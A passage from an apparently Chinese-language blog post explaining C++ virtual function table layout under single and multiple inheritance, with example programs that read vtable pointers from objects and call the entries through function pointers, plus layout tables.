id="单继承有覆盖"><a href="#单继承有覆盖" class="headerlink" title="单继承有覆盖"></a>单继承有覆盖</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base:Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base:Function_2...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base:Function_3...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Function_2...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_6</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Function_6...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//查看 Sub 的虚函数表</span><br>    Sub sub;<br><br>    <span class="hljs-comment">//对象的前四个字节就是虚函数表</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>    <span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br>    pFunction pFn;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br>        <span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pFn = (pFunction)temp;<br>        pFn();<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + <span class="hljs-number">6</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th>虚函数表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Sub对象</td><td>0x123245</td><td>—&gt;</td><td>0x123456</td><td></td><td>Sub:Function_1</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x123457</td><td></td><td>Sub:Function_2</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Base:Function_3</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Sub:Function_6</td><td></td></tr><tr><td></td><td>..</td><td></td><td>00000000</td><td></td><td></td><td></td></tr><tr><td></td><td>其他成员</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="多继承无覆盖"><a href="#多继承无覆盖" class="headerlink" title="多继承无覆盖"></a>多继承无覆盖</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base1</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_2...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base2</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_3...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_4...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base1, Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_5...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_6</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_6...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//查看 Sub 的虚函数表</span><br>Sub sub;<br><br><span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><br><span class="hljs-comment">//对象的前四个字节是第一个Base1的虚表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>pFunction pFn;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br><span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pFn = (pFunction)temp;<br>pFn();<br>&#125;<br><br><span class="hljs-comment">//对象的第二个四字节是Base2的虚表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)((<span class="hljs-keyword">int</span>)&amp;sub + <span class="hljs-number">4</span>));<br><br>pFunction pFn1;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">2</span>; k++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)((<span class="hljs-keyword">int</span>)&amp;sub + <span class="hljs-number">4</span>)) + k);<br>pFn1 = (pFunction)temp;<br>pFn1();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>多继承就有俩虚表了这边注意</p><table><thead><tr><th>Sub对象</th><th>0x123245</th><th>—&gt;</th><th>Fn_1()</th><th>Fn_2()</th><th>Sub:Fn_5</th><th>Sub:Fn_6</th><th></th></tr></thead><tbody><tr><td></td><td>0x345678</td><td>—&gt;</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td>Fn_3()</td><td>Fn_4()</td><td></td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>其他成员</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>此时Sub对象的大小为8字节</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="多继承有覆盖"><a href="#多继承有覆盖" class="headerlink" title="多继承有覆盖"></a>多继承有覆盖</h2><h3 id="情形1"><a href="#情形1" class="headerlink" title="情形1"></a>情形1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base1</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_2...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base2</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_3...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base2:Fn_4...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base1, Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_3...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Fn_5...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//查看 Sub 的虚函数表</span><br>Sub sub;<br><br><span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><br><span class="hljs-comment">//对象的前四个字节是第一个Base1的虚表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>pFunction pFn;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br><span class="hljs-keyword">if</span> (temp == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pFn = (pFunction)temp;<br>pFn();<br>&#125;<br><br><span class="hljs-comment">//对象的第二个四字节是Base2的虚表</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)((<span class="hljs-keyword">int</span>)&amp;sub + <span class="hljs-number">4</span>));<br><br>pFunction pFn1;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">2</span>; k++)<br>&#123;<br><span class="hljs-keyword">int</span> temp = *((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)((<span class="hljs-keyword">int</span>)&amp;sub + <span class="hljs-number">4</span>)) + k);<br>pFn1 = (pFunction)temp;<br>pFn1();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th>Sub对象</th><th>0x123245</th><th>—&gt;</th><th>Sub:Fn_1</th><th>Base1:Fn_2</th><th>Sub:Fn_5</th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td>0x345678</td><td>—&gt;</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td>Sub:Fn_3</td><td>Base2:Fn_4</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>..</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>其他成员</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td>此时Sub对象的大小为8字节</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="情形2"><a href="#情形2" class="headerlink" title="情形2"></a>情形2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base1</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_1...\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Fn_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base1:Fn_2...\n&quot;</span>);<br>&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base2</span> :</span>Base1<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span 